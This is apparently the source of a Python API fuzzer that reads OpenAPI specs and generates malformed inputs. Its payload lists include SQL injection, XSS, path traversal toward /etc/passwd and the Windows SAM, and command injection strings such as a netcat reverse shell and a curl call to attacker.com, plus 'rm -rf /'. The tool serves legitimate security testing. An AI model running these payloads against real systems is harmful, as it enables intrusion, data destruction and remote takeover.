```python
import json
import sys
import time
import random
import string
import urllib.parse
import argparse
from typing import Dict, List, Tuple, Any, Optional
from dataclasses import dataclass
from enum import Enum
import logging
from datetime import datetime
import hashlib

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("Error: requests library is required. Install with: pip install requests")
    sys.exit(1)

try:
    import yaml
except ImportError:
    print("Error: pyyaml library is required. Install with: pip install pyyaml")
    sys.exit(1)


class PayloadType(Enum):
    """Enumeration of different payload types for fuzzing"""
    LONG_STRING = "long_string"
    SQL_INJECTION = "sql_injection"
    XSS_PAYLOAD = "xss_payload"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    NULL_BYTE = "null_byte"
    UNICODE_PAYLOAD = "unicode_payload"
    SPECIAL_CHARS = "special_chars"
    LARGE_NUMBER = "large_number"
    NEGATIVE_NUMBER = "negative_number"
    FLOAT_PAYLOAD = "float_payload"
    BOOLEAN_PAYLOAD = "boolean_payload"
    ARRAY_PAYLOAD = "array_payload"
    OBJECT_PAYLOAD = "object_payload"
    EMPTY_PAYLOAD = "empty_payload"
    WHITESPACE_PAYLOAD = "whitespace_payload"
    CONTROL_CHARS = "control_chars"
    BINARY_PAYLOAD = "binary_payload"


@dataclass
class FuzzingResult:
    """Data class to store fuzzing results"""
    endpoint: str
    method: str
    payload_type: PayloadType
    status_code: Optional[int]
    response_time: float
    error_message: Optional[str]
    payload_sample: str
    timestamp: str
    content_type_used: str
    is_crash: bool
    response_length: int


class PayloadGenerator:
    """Generates various malformed payloads for fuzzing"""
    
    def __init__(self, seed: int = 42):
        """Initialize payload generator with optional seed for reproducibility"""
        random.seed(seed)
        self.seed = seed
        self.payload_cache = {}
    
    def generate_long_string(self, length: int = 10000) -> str:
        """Generate a very long string payload"""
        return "A" * length
    
    def generate_sql_injection_payloads(self) -> List[str]:
        """Generate common SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, NULL, NULL --",
            "admin' --",
            "' OR 1=1 --",
            "1' AND '1'='1",
            "' OR 'a'='a",
            "1; DELETE FROM users WHERE '1'='1",
            "' UNION ALL SELECT NULL --",
            "1' OR '1'='1' /*",
        ]
        return payloads
    
    def generate_xss_payloads(self) -> List[str]:
        """Generate XSS attack payloads"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')></marquee>",
            "<details open ontoggle=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
        ]
        return payloads
    
    def generate_command_injection_payloads(self) -> List[str]:
        """Generate command injection payloads"""
        payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -e /bin/sh attacker.com 4444",
            "; curl http://attacker.com",
            "'; exec('system($_GET[\"cmd\"])'); '",
            "| python -c 'import os; os.system(\"id\")'",
        ]
        return payloads
    
    def generate_path_traversal_payloads(self) -> List[str]:
        """Generate path traversal payloads"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%afetc%c0%afpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32",
            "/etc/passwd%00.jpg",
            "..;/..;/..;/etc/passwd",
            "file:///etc/passwd",
            "....//....//....//windows/win.ini",
        ]
        return payloads
    
    def generate_null_byte_payloads(self) -> List[str]:
        """Generate null byte injection payloads"""
        payloads = [
            "test\x00.jpg",
            "file\x00.txt",
            "admin\x00.php",
            "\x00\x00\x00\x00",
            "payload\x00\x00\x00",
        ]
        return payloads
    
    def generate_unicode_payloads(self) -> List[str]:
        """Generate unicode-based payloads"""
        payloads = [
            "\u0000\u0001\u0002",
            "\uffff\ufffe",
            "𝕳𝖊𝖑𝖑𝖔",
            "\u202e\u202d",
            "‮test",
        ]
        return payloads
    
    def generate_special_chars_payload(self) -> str:
        """Generate payload with special characters"""
        special_chars = "!@#$%^&*()_+-=[]{}|;:',.<>?/~`"
        return special_chars * 100
    
    def generate_large_number(self) -> str:
        """Generate very large number payload"""
        return str(10 ** 308)
    
    def generate_negative_number(self) -> str:
        """Generate negative number payload"""
        return str(-10 ** 308)
    
    def generate_float_payload(self) -> str:
        """Generate float payload"""
        return "3.14159265358979323846264338327950288419716939937510"
    
    def generate_boolean_payloads(self) -> List[str]:
        """Generate boolean-like payloads"""
        return ["true", "false", "True", "False", "TRUE", "FALSE", "yes", "no", "1", "0"]
    
    def generate_array_payload(self) -> str:
        """Generate array-like payload"""
        return json.dumps([1, 2, 3, "test", None, True, False] * 100)
    
    def generate_object_payload(self) -> str:
        """Generate object/dict payload"""
        obj = {
            "key1": "value1",
            "key2": 12345,
            "key3": None,
            "key4": True,
            "nested": {"deep": {"deeper": "value"}}
        }
        return json.dumps(obj)
    
    def generate_empty_payload(self) -> str:
        """Generate empty payload"""
        return ""
    
    def generate_whitespace_payload(self) -> str:
        """Generate whitespace-only payload"""
        return " " * 1000 + "\t" * 1000 + "\n" * 1000
    
    def generate_control_chars(self) -> str:
        """Generate control characters payload"""
        return "".join(chr(i) for i in range(0, 32))
    
    def generate_binary_payload(self) -> bytes:
        """Generate random binary payload"""
        return bytes(random.randint(0, 255) for _ in range(1000))
    
    def get_payload(self, payload_type: PayloadType) -> Any:
        """Get payload based on type"""
        if payload_type == PayloadType.LONG_STRING:
            return self.generate_long_string()
        elif payload_type == PayloadType.SQL_INJECTION:
            return random.choice(self.generate_sql_injection_payloads())
        elif payload_type == PayloadType.XSS_PAYLOAD:
            return random.choice(self.generate_xss_payloads())
        elif payload_type == PayloadType.COMMAND_INJECTION:
            return random.choice(self.generate_command_injection_payloads())
        elif payload_type == PayloadType.PATH_TRAVERSAL:
            return random.choice(self.generate_path_traversal_payloads())
        elif payload_type == PayloadType.NULL_BYTE:
            return random.choice(self.generate_null_byte_payloads())
        elif payload_type == PayloadType.UNICODE_PAYLOAD:
            return random.choice(self.generate_unicode_payloads())
        elif payload_type == PayloadType.SPECIAL_CHARS:
            return self.generate_special_chars_payload()
        elif payload_type == PayloadType.LARGE_NUMBER:
            return self.generate_large_number()
        elif payload_type == PayloadType.NEGATIVE_NUMBER:
            return self.generate_negative_number()
        elif payload_type == PayloadType.FLOAT_PAYLOAD:
            return self.generate_float_payload()
        elif payload_type == PayloadType.BOOLEAN_PAYLOAD:
            return random.choice(self.generate_boolean_payloads())
        elif payload_type == PayloadType.ARRAY_PAYLOAD:
            return self.generate_array_payload()
        elif payload_type == PayloadType.OBJECT_PAYLOAD:
            return self.generate_object_payload()
        elif payload_type == PayloadType.EMPTY_PAYLOAD:
            return self.generate_empty_payload()
        elif payload_type == PayloadType.WHITESPACE_PAYLOAD:
            return self.generate_whitespace_payload()
        elif payload_type == PayloadType.CONTROL_CHARS:
            return self.generate_control_chars()
        elif payload_type == PayloadType.BINARY_PAYLOAD:
            return self.generate_binary_payload()
        else:
            return ""


class OpenAPIParser:
    """Parse OpenAPI/Swagger specifications"""
    
    def __init__(self, spec_path: str):
        """Initialize parser with spec file path"""
        self.spec_path = spec_path
        self.spec = None
        self.endpoints = []
        self.base_url = ""
    
    def load_spec(self) -> bool:
        """Load and parse OpenAPI specification"""
        try:
            with open(self.spec_path, 'r') as f:
                if self.spec_path.endswith('.json'):
                    self.spec = json.load(f)
                elif self.spec_path.endswith('.yaml') or self.spec_path.endswith('.yml'):
                    self.spec = yaml.safe_load(f)
                else:
                    print(f"Unsupported file format: {self.spec_path}")
                    return False
            return True
        except Exception as e:
            print(f"Error loading spec: {e}")
            return False
    
    def extract_endpoints(self) -> List[Dict[str, Any]]:
        """Extract all endpoints from the specification"""
        if not self.spec:
            return []
        
        endpoints = []
        
        if 'servers' in self.spec and len(self.spec['servers']) > 0:
            self.base_url = self.spec['servers'][0].get('url', '')
        
        if 'paths' in self.spec:
            for path, path_item in self.spec['paths'].items():
                for method, operation in path_item.items():
                    if method.lower() in ['get', 'post', 'put', 'delete', 'patch', 'head', 'options']:
                        endpoint = {
                            'path': path,
                            'method': method.upper(),
                            'operation': operation,
                            'parameters': operation.get('parameters', []),
                            'request_body': operation.get('requestBody', {}),
                            'responses': operation.get('responses', {}),
                        }
                        endpoints.append(endpoint)
        
        self.endpoints = endpoints
        return endpoints
    
    def get_base_url(self) -> str:
        """Get base URL from specification"""
        return self.base_url


class FuzzerEngine:
    """Main fuzzing engine"""
    
    def __init__(self, base_url: str, timeout: int = 10, max_retries: int = 3):
        """Initialize fuzzer engine"""
        self.base_url = base_url
        self.timeout = timeout
        self.max_retries = max_retries
        self.session = self._create_session()
        self.payload_generator = PayloadGenerator()
        self.results = []
        self.logger = self._setup_logger()
        self.content_types = [
            'application/json',
            'application/x-www-form-urlencoded',
            'text/plain',
            'text/html',
            'application/xml',
            'application/octet-stream',
            'multipart/form-data',
            'application/json; charset=utf-8',
            'text/xml',
            'application/ld+json',
        ]
    
    def _create_session(self) -> requests.Session:
        """Create requests session with retry strategy"""
        session = requests.Session()
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=0.1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session
    
    def _setup_logger(self) -> logging.Logger:
        """Setup logging"""
        logger = logging.getLogger('api_fuzzer')
        logger.setLevel(logging.INFO)
        handler = logging.StreamHandler()
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger
    
    def _construct_url(self, endpoint_path: str, parameters: List[Dict] = None) -> str:
        """Construct full URL from base URL and endpoint path"""
        url = self.base_url.rstrip('/') + '/' + endpoint_path.lstrip('/')
        
        if parameters:
            query_params = {}
            for param in parameters:
                if param.get('in') == 'query':
                    param_name = param.get('name', 'param')
                    query_params[param_name] = 'test_value'
            
            if query_params:
                url += '?' + urllib.parse.urlencode(query_params)
        
        return url